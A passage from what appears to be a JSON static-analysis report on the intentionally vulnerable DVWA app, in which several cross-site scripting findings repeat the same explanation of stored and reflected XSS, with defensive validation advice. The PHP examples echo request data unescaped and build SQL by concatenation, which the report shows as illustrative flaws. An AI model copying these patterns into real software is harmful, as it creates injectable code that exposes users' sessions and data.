            "text" : "Cross-site scripting (XSS) vulnerabilities occur when:\n\n1. Data enters a web application through an untrusted source. In the case of persistent (also known as stored) XSS, the untrusted source is typically a database or other back-end data store, while in the case of reflected XSS it is typically a web request.\n\n\nIn this case, the data enters at mysqli_query() in high.php on line 11.\n\n2. The data is included in dynamic content that is sent to a web user without validation.\n\nIn this case, the data is sent at builtin_echo() in dvwaPage.inc.php on line 345.\n\nThe malicious content sent to the web browser often takes the form of a JavaScript segment, but can also include HTML, Flash or any other type of code that the browser executes. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data such as cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.\n\nExample 1: The following PHP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.\n\n\n&lt;?php...\n $con = mysql_connect($server,$user,$password);\n ...\n $result = mysql_query(\"select * from emp where id=\"+eid);\n $row = mysql_fetch_array($result)\n echo 'Employee name: ', mysql_result($row,0,'name');\n ...\n?&gt;\n\n\nThis code functions correctly when the values of name are well-behaved, but it does nothing to prevent exploits if they are not. This code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker may execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it difficult to identify the threat and increases the possibility that the attack might affect multiple users. XSS got its start in this form with web sites that offered a \"guestbook\" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code.\n\nExample 2: The following PHP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.\n\n\n&lt;?php\n\t$eid = $_GET['eid'];\n\t...\n?&gt;\n...\n&lt;?php\n\techo \"Employee ID: $eid\";\n?&gt;\n\n\nAs in Example 1, this code operates correctly if eid contains only standard alphanumeric text. If eid has a value that includes metacharacters or source code, then the code is executed by the web browser as it displays the HTTP response.\n\nInitially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use email or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS.\n\nAs the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:\n\n- As in Example 1, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.\n\n- As in Example 2, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or emailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that might include session information, from the user's machine to the attacker or perform other nefarious activities.\n\n- A source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.\n\nThe solution to prevent XSS is to ensure that validation occurs in the required places and that relevant properties are set to prevent vulnerabilities.\n\nBecause XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS.\n\nWeb applications must validate all input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application might accept input through a shared data store or other trusted source, and that data store might accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means that the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user.\n\nThe most secure approach to validation for XSS is to create an allow list of safe characters that can appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alphanumeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser must be considered valid input after they are encoded, such as a web design bulletin board that must accept HTML fragments from its users.\n\nA more flexible, but less secure approach is to implement a deny list, which selectively rejects or escapes potentially dangerous characters before using the input. To form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines which characters have special meaning, many web browsers try to correct common mistakes in HTML and might treat other characters as special in certain contexts. This is why we do not recommend the use of deny lists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]:\n\nIn the content of a block-level element (in the middle of a paragraph of text):\n\n- \"&lt;\" is special because it introduces a tag.\n\n- \"&amp;\" is special because it introduces a character entity.\n\n- \"&gt;\" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening \"&lt;\", but omitted it in error.\n\nThe following principles apply to attribute values:\n\n- In attribute values enclosed in double quotes, the double quotes are special because they mark the end of the attribute value.\n\n- In attribute values enclosed in single quotes, the single quotes are special because they mark the end of the attribute value.\n\n- In attribute values without any quotes, white-space characters, such as space and tab, are special.\n\n- \"&amp;\" is special when used with certain attributes, because it introduces a character entity.\n\nIn URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters:\n\n- Space, tab, and new line are special because they mark the end of the URL.\n\n- \"&amp;\" is special because it either introduces a character entity or separates CGI parameters.\n\n- Non-ASCII characters (that is, everything greater than 127 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context.\n\n- The \"%\" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, \"%\" must be filtered if input such as \"%68%65%6C%6C%6F\" becomes \"hello\" when it appears on the web page.\n\n\nWithin the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;:\n\n- Semicolons, parentheses, curly braces, and new line characters must be filtered out in situations where text could be inserted directly into a pre-existing script tag.\n\nServer-side scripts:\n\n- Server-side scripts that convert any exclamation characters (!) in input to double-quote characters (\") on output might require additional filtering.\n\nOther possibilities:\n\n- If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and might bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7).\n\nAfter you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and might be unacceptable in circumstances where the integrity of the input must be preserved for display.\n\nIf input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2].\n\nMany application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. For any developed application, there are no guarantees about which application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will continue to stay in sync.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4557/?engineType=SCA&issue=79476D57F56E8EADA08C350075011DB1"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4564",
          "shortDescription" : {
            "text" : "Cross-Site Scripting: Reflected"
          },
          "fullDescription" : {
            "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
          },
          "help" : {
            "text" : "Cross-site scripting (XSS) vulnerabilities occur when:\n\n1. Data enters a web application through an untrusted source. In the case of reflected XSS, the untrusted source is typically a web request, while in the case of persisted (also known as stored) XSS it is typically a database or other back-end data store.\n\n\n2. The data is included in dynamic content that is sent to a web user without validation.\n\nIn this case, the data is sent at builtin_echo() in dvwaPage.inc.php on line 345.\n\nThe malicious content sent to the web browser often takes the form of a JavaScript segment, but can also include HTML, Flash or any other type of code that the browser executes. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data such as cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.\n\nExample 1: The following PHP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.\n\n\n&lt;?php\n\t$eid = $_GET['eid'];\n\t...\n?&gt;\n...\n&lt;?php\n\techo \"Employee ID: $eid\";\n?&gt;\n\n\nThe code in this example operates correctly if eid contains only standard alphanumeric text. If eid has a value that includes metacharacters or source code, then the code is executed by the web browser as it displays the HTTP response.\n\nInitially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use email or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS.\n\nExample 2: The following PHP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.\n\n\n&lt;?php...\n $con = mysql_connect($server,$user,$password);\n ...\n $result = mysql_query(\"select * from emp where id=\"+eid);\n $row = mysql_fetch_array($result)\n echo 'Employee name: ', mysql_result($row,0,'name');\n ...\n?&gt;\n\n\nAs in Example 1, this code functions correctly when the values of name are well-behaved, but it does nothing to prevent exploits if they are not. Again, this code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker may execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it difficult to identify the threat and increases the possibility that the attack might affect multiple users. XSS got its start in this form with web sites that offered a \"guestbook\" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code.\n\nAs the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:\n\n- As in Example 1, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or emailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that might include session information, from the user's machine to the attacker or perform other nefarious activities.\n\n- As in Example 2, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.\n\n- A source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.\n\nThe solution to prevent XSS is to ensure that validation occurs in the required places and that relevant properties are set to prevent vulnerabilities.\n\nBecause XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS.\n\nWeb applications must validate all input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application might accept input through a shared data store or other trusted source, and that data store might accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means that the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user.\n\nThe most secure approach to validation for XSS is to create an allow list of safe characters that can appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alphanumeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser must be considered valid input after they are encoded, such as a web design bulletin board that must accept HTML fragments from its users.\n\nA more flexible, but less secure approach is to implement a deny list, which selectively rejects or escapes potentially dangerous characters before using the input. To form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines which characters have special meaning, many web browsers try to correct common mistakes in HTML and might treat other characters as special in certain contexts. This is why we do not recommend the use of deny lists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]:\n\nIn the content of a block-level element (in the middle of a paragraph of text):\n\n- \"&lt;\" is special because it introduces a tag.\n\n- \"&amp;\" is special because it introduces a character entity.\n\n- \"&gt;\" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening \"&lt;\", but omitted it in error.\n\nThe following principles apply to attribute values:\n\n- In attribute values enclosed in double quotes, the double quotes are special because they mark the end of the attribute value.\n\n- In attribute values enclosed in single quotes, the single quotes are special because they mark the end of the attribute value.\n\n- In attribute values without any quotes, white-space characters, such as space and tab, are special.\n\n- \"&amp;\" is special when used with certain attributes, because it introduces a character entity.\n\nIn URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters:\n\n- Space, tab, and new line are special because they mark the end of the URL.\n\n- \"&amp;\" is special because it either introduces a character entity or separates CGI parameters.\n\n- Non-ASCII characters (that is, everything greater than 127 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context.\n\n- The \"%\" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, \"%\" must be filtered if input such as \"%68%65%6C%6C%6F\" becomes \"hello\" when it appears on the web page.\n\n\nWithin the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;:\n\n- Semicolons, parentheses, curly braces, and new line characters must be filtered out in situations where text could be inserted directly into a pre-existing script tag.\n\nServer-side scripts:\n\n- Server-side scripts that convert any exclamation characters (!) in input to double-quote characters (\") on output might require additional filtering.\n\nOther possibilities:\n\n- If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and might bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7).\n\nAfter you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and might be unacceptable in circumstances where the integrity of the input must be preserved for display.\n\nIf input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2].\n\nMany application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. For any developed application, there are no guarantees about which application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will continue to stay in sync.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4564/?engineType=SCA&issue=7C356B7638204790DAB2BE039DC07346"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4571",
          "shortDescription" : {
            "text" : "Cross-Site Scripting: Reflected"
          },
          "fullDescription" : {
            "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
          },
          "help" : {
            "text" : "Cross-site scripting (XSS) vulnerabilities occur when:\n\n1. Data enters a web application through an untrusted source. In the case of reflected XSS, the untrusted source is typically a web request, while in the case of persisted (also known as stored) XSS it is typically a database or other back-end data store.\n\n\n2. The data is included in dynamic content that is sent to a web user without validation.\n\nIn this case, the data is sent at builtin_echo() in dvwaPage.inc.php on line 345.\n\nThe malicious content sent to the web browser often takes the form of a JavaScript segment, but can also include HTML, Flash or any other type of code that the browser executes. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data such as cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.\n\nExample 1: The following PHP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.\n\n\n&lt;?php\n\t$eid = $_GET['eid'];\n\t...\n?&gt;\n...\n&lt;?php\n\techo \"Employee ID: $eid\";\n?&gt;\n\n\nThe code in this example operates correctly if eid contains only standard alphanumeric text. If eid has a value that includes metacharacters or source code, then the code is executed by the web browser as it displays the HTTP response.\n\nInitially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use email or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS.\n\nExample 2: The following PHP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.\n\n\n&lt;?php...\n $con = mysql_connect($server,$user,$password);\n ...\n $result = mysql_query(\"select * from emp where id=\"+eid);\n $row = mysql_fetch_array($result)\n echo 'Employee name: ', mysql_result($row,0,'name');\n ...\n?&gt;\n\n\nAs in Example 1, this code functions correctly when the values of name are well-behaved, but it does nothing to prevent exploits if they are not. Again, this code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker may execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it difficult to identify the threat and increases the possibility that the attack might affect multiple users. XSS got its start in this form with web sites that offered a \"guestbook\" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code.\n\nAs the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:\n\n- As in Example 1, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or emailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that might include session information, from the user's machine to the attacker or perform other nefarious activities.\n\n- As in Example 2, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.\n\n- A source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.\n\nThe solution to prevent XSS is to ensure that validation occurs in the required places and that relevant properties are set to prevent vulnerabilities.\n\nBecause XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS.\n\nWeb applications must validate all input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application might accept input through a shared data store or other trusted source, and that data store might accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means that the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user.\n\nThe most secure approach to validation for XSS is to create an allow list of safe characters that can appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alphanumeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser must be considered valid input after they are encoded, such as a web design bulletin board that must accept HTML fragments from its users.\n\nA more flexible, but less secure approach is to implement a deny list, which selectively rejects or escapes potentially dangerous characters before using the input. To form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines which characters have special meaning, many web browsers try to correct common mistakes in HTML and might treat other characters as special in certain contexts. This is why we do not recommend the use of deny lists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]:\n\nIn the content of a block-level element (in the middle of a paragraph of text):\n\n- \"&lt;\" is special because it introduces a tag.\n\n- \"&amp;\" is special because it introduces a character entity.\n\n- \"&gt;\" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening \"&lt;\", but omitted it in error.\n\nThe following principles apply to attribute values:\n\n- In attribute values enclosed in double quotes, the double quotes are special because they mark the end of the attribute value.\n\n- In attribute values enclosed in single quotes, the single quotes are special because they mark the end of the attribute value.\n\n- In attribute values without any quotes, white-space characters, such as space and tab, are special.\n\n- \"&amp;\" is special when used with certain attributes, because it introduces a character entity.\n\nIn URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters:\n\n- Space, tab, and new line are special because they mark the end of the URL.\n\n- \"&amp;\" is special because it either introduces a character entity or separates CGI parameters.\n\n- Non-ASCII characters (that is, everything greater than 127 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context.\n\n- The \"%\" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, \"%\" must be filtered if input such as \"%68%65%6C%6C%6F\" becomes \"hello\" when it appears on the web page.\n\n\nWithin the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;:\n\n- Semicolons, parentheses, curly braces, and new line characters must be filtered out in situations where text could be inserted directly into a pre-existing script tag.\n\nServer-side scripts:\n\n- Server-side scripts that convert any exclamation characters (!) in input to double-quote characters (\") on output might require additional filtering.\n\nOther possibilities:\n\n- If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and might bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7).\n\nAfter you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and might be unacceptable in circumstances where the integrity of the input must be preserved for display.\n\nIf input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2].\n\nMany application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. For any developed application, there are no guarantees about which application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will continue to stay in sync.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4571/?engineType=SCA&issue=83FDA19BA05A6C764C63C2CF4F37C9A2"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4575",
          "shortDescription" : {
            "text" : "Cross-Site Scripting: Reflected"
          },
          "fullDescription" : {
            "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
          },
          "help" : {
            "text" : "Cross-site scripting (XSS) vulnerabilities occur when:\n\n1. Data enters a web application through an untrusted source. In the case of reflected XSS, the untrusted source is typically a web request, while in the case of persisted (also known as stored) XSS it is typically a database or other back-end data store.\n\n\n2. The data is included in dynamic content that is sent to a web user without validation.\n\nIn this case, the data is sent at builtin_echo() in dvwaPage.inc.php on line 345.\n\nThe malicious content sent to the web browser often takes the form of a JavaScript segment, but can also include HTML, Flash or any other type of code that the browser executes. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data such as cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.\n\nExample 1: The following PHP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.\n\n\n&lt;?php\n\t$eid = $_GET['eid'];\n\t...\n?&gt;\n...\n&lt;?php\n\techo \"Employee ID: $eid\";\n?&gt;\n\n\nThe code in this example operates correctly if eid contains only standard alphanumeric text. If eid has a value that includes metacharacters or source code, then the code is executed by the web browser as it displays the HTTP response.\n\nInitially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use email or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS.\n\nExample 2: The following PHP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.\n\n\n&lt;?php...\n $con = mysql_connect($server,$user,$password);\n ...\n $result = mysql_query(\"select * from emp where id=\"+eid);\n $row = mysql_fetch_array($result)\n echo 'Employee name: ', mysql_result($row,0,'name');\n ...\n?&gt;\n\n\nAs in Example 1, this code functions correctly when the values of name are well-behaved, but it does nothing to prevent exploits if they are not. Again, this code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker may execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it difficult to identify the threat and increases the possibility that the attack might affect multiple users. XSS got its start in this form with web sites that offered a \"guestbook\" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code.\n\nAs the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:\n\n- As in Example 1, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or emailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that might include session information, from the user's machine to the attacker or perform other nefarious activities.\n\n- As in Example 2, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.\n\n- A source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.\n\nThe solution to prevent XSS is to ensure that validation occurs in the required places and that relevant properties are set to prevent vulnerabilities.\n\nBecause XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS.\n\nWeb applications must validate all input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application might accept input through a shared data store or other trusted source, and that data store might accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means that the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user.\n\nThe most secure approach to validation for XSS is to create an allow list of safe characters that can appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alphanumeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser must be considered valid input after they are encoded, such as a web design bulletin board that must accept HTML fragments from its users.\n\nA more flexible, but less secure approach is to implement a deny list, which selectively rejects or escapes potentially dangerous characters before using the input. To form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines which characters have special meaning, many web browsers try to correct common mistakes in HTML and might treat other characters as special in certain contexts. This is why we do not recommend the use of deny lists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]:\n\nIn the content of a block-level element (in the middle of a paragraph of text):\n\n- \"&lt;\" is special because it introduces a tag.\n\n- \"&amp;\" is special because it introduces a character entity.\n\n- \"&gt;\" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening \"&lt;\", but omitted it in error.\n\nThe following principles apply to attribute values:\n\n- In attribute values enclosed in double quotes, the double quotes are special because they mark the end of the attribute value.\n\n- In attribute values enclosed in single quotes, the single quotes are special because they mark the end of the attribute value.\n\n- In attribute values without any quotes, white-space characters, such as space and tab, are special.\n\n- \"&amp;\" is special when used with certain attributes, because it introduces a character entity.\n\nIn URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search 